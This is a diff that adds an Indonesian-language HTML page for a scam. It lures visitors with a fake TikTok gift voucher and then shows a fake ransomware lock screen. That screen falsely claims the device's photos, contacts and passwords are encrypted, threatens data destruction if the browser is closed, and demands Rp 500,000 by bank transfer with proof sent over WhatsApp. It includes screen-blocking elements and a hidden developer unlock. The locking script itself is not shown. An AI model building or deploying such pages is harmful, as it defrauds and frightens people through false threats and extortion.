@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#000000">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>🎁 FREE GIFT VOUCHER!</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="manifest" href="manifest.json">
+</head>
+<body>
+    <!-- Halaman Utama -->
+    <div id="mainPage" class="page active">
+        <div class="main-content">
+            <div class="header-glow">
+                <h1 class="title">🎁 HADIAH GRATIS 1 JUTA!</h1>
+                <div class="fireworks">✨🎉✨</div>
+            </div>
+            
+            <div class="prize-card">
+                <div class="prize-icon">💰</div>
+                <h2>VOUCHER Rp 1.000.000</h2>
+                <p>Dari: <span class="sponsor">TIKTOK INDONESIA</span></p>
+                <div class="validity">
+                    <p>⏰ Berlaku: <span class="time">5 menit lagi</span></p>
+                </div>
+            </div>
+            
+            <div class="instructions">
+                <p><strong>CARA KLIM:</strong></p>
+                <ol>
+                    <li>Klik tombol CLAIM dibawah</li>
+                    <li>Isi data penerima</li>
+                    <li>Voucher dikirim via WhatsApp</li>
+                </ol>
+            </div>
+            
+            <!-- TOMBOL UTAMA -->
+            <button id="claimButton" class="claim-btn">
+                <span class="btn-main">🚀 CLAIM VOUCHER NOW!</span>
+                <span class="btn-sub">GRATIS 100% • NO SCAM</span>
+            </button>
+            
+            <div class="warning-box">
+                <p class="warning">⚠️ <strong>PERINGATAN:</strong> Hanya untuk HP Android/iOS. Pastikan koneksi internet stabil!</p>
+            </div>
+            
+            <div class="user-count">
+                <p>👥 <span id="userCount">1,247</span> users sudah claim hari ini!</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== LAYAR RANSOMWARE ===== -->
+    <div id="lockScreen" class="page">
+        <!-- Overlay Blocker -->
+        <div class="blocker-overlay"></div>
+        
+        <!-- Konten Ransomware -->
+        <div class="ransomware-container">
+            <!-- Header Virus -->
+            <div class="virus-header">
+                <div class="warning-sign">☣️</div>
+                <h1 class="virus-title" id="glitchText">SYSTEM LOCKED - VIRUS DETECTED</h1>
+                <div class="virus-animation">
+                    <span class="virus">🦠</span>
+                    <span class="virus">💀</span>
+                    <span class="virus">⚠️</span>
+                </div>
+            </div>
+            
+            <!-- Status Device -->
+            <div class="device-status">
+                <div class="status-item">
+                    <span class="status-icon">📱</span>
+                    <span class="status-text">DEVICE: <span class="red">LOCKED</span></span>
+                </div>
+                <div class="status-item">
+                    <span class="status-icon">🔒</span>
+                    <span class="status-text">ENCRYPTION: <span class="red">100%</span></span>
+                </div>
+                <div class="status-item">
+                    <span class="status-icon">⏰</span>
+                    <span class="status-text">TIME LEFT: <span id="countdownTimer">59:59</span></span>
+                </div>
+            </div>
+            
+            <!-- Pesan Ancaman -->
+            <div class="threat-message-box">
+                <p class="threat-title">⚠️ YOUR DEVICE HAS BEEN ENCRYPTED!</p>
+                <div class="encrypted-files">
+                    <p>📸 <span class="strike">Photos (2,347 files)</span> <span class="red">[ENCRYPTED]</span></p>
+                    <p>💬 <span class="strike">Messages & Chats</span> <span class="red">[ENCRYPTED]</span></p>
+                    <p>👤 <span class="strike">Contacts (584 contacts)</span> <span class="red">[ENCRYPTED]</span></p>
+                    <p>📁 <span class="strike">Documents & Files</span> <span class="red">[ENCRYPTED]</span></p>
+                    <p>🔑 <span class="strike">Passwords & Logins</span> <span class="red">[ENCRYPTED]</span></p>
+                </div>
+                
+                <div class="danger-alert">
+                    <p class="danger-text">🚨 <strong>WARNING:</strong> If you try to restart, close browser, or force stop - ALL DATA WILL BE PERMANENTLY DELETED!</p>
+                </div>
+            </div>
+            
+            <!-- Input Kode -->
+            <div class="unlock-section">
+                <h3 class="unlock-title">🔓 ENTER UNLOCK CODE:</h3>
+                <p class="unlock-info">Only correct code can decrypt your device!</p>
+                
+                <div class="code-input-container">
+                    <input type="text" 
+                           id="unlockCodeInput"
+                           class="code-input"
+                           placeholder="TYPE UNLOCK CODE HERE..."
+                           maxlength="20"
+                           autocomplete="off"
+                           spellcheck="false">
+                    <button id="submitCodeBtn" class="submit-code-btn">
+                        DECRYPT DEVICE
+                    </button>
+                </div>
+                
+                <div class="attempts-info">
+                    <p>🔐 Attempts: <span id="attemptCount">0</span>/5</p>
+                    <p id="errorDisplay" class="error-message"></p>
+                </div>
+                
+                <div class="code-hint">
+                    <p>💡 Hint: Code consists of 10 letters (lowercase)</p>
+                </div>
+            </div>
+            
+            <!-- Payment Information -->
+            <div class="payment-section">
+                <div class payment-header>
+                    <h3>💰 GET UNLOCK CODE:</h3>
+                    <div class="price-tag">Rp 500.000</div>
+                </div>
+                
+                <div class="payment-steps">
+                    <p>1. Transfer payment to:</p>
+                    <div class="bank-info">
+                        <p>🏦 Bank: BCA</p>
+                        <p>💳 Account: 123-456-7890</p>
+                        <p>👤 Name: Wanzy Xyzet</p>
+                    </div>
+                    
+                    <p>2. Contact WhatsApp with payment proof:</p>
+                    <div class="contact-info">
+                        <p class="whatsapp-contact">📱 WhatsApp: <strong class="wa-number">628381058544</strong></p>
+                    </div>
+                    
+                    <a href="https://wa.me/628381058544?text=Saya%20sudah%20transfer%20untuk%20kode%20unlock%20ransomware%20-%20Berikut%20bukti%20transfernya:"
+                       target="_blank"
+                       id="whatsappBtn"
+                       class="whatsapp-btn">
+                        <span class="wa-icon">💬</span>
+                        SEND PROOF VIA WHATSAPP
+                    </a>
+                    
+                    <p class="delivery-info">⏱️ Code will be sent within 3 minutes after verification</p>
+                </div>
+            </div>
+            
+            <!-- Emergency Warning -->
+            <div class="emergency-warning">
+                <p>🚫 DO NOT: Close Browser • Restart Phone • Clear Cache • Force Stop</p>
+                <p>🚫 DO NOT: Switch Apps • Turn Off Screen • Uninstall Browser</p>
+                <p class="warning-red">⚠️ Any attempt to escape will trigger DATA DESTRUCTION!</p>
+            </div>
+            
+            <!-- Hidden Elements for Full Lock -->
+            <div id="fullScreenBlocker" class="full-blocker"></div>
+            <div id="forceFocus" tabindex="-1" class="force-focus"></div>
+            
+            <!-- Audio Elements -->
+            <audio id="scarySound" loop>
+                <source src="https://assets.mixkit.co/sfx/preview/mixkit-horror-laugh-583.mp3" type="audio/mpeg">
+            </audio>
+            <audio id="tickingSound" loop>
+                <source src="https://assets.mixkit.co/sfx/preview/mixkit-unlock-game-notification-253.mp3" type="audio/mpeg">
+            </audio>
+            <audio id="errorSound" preload="auto">
+                <source src="https://assets.mixkit.co/sfx/preview/mixkit-wrong-answer-fail-notification-946.mp3" type="audio/mpeg">
+            </audio>
+        </div>
+    </div>
+
+    <!-- Developer Escape (Hidden) -->
+    <div id="devEscape" style="display: none;">
+        <input type="password" id="devPassword" placeholder="Dev Password">
+        <button onclick="devUnlock()">UNLOCK</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
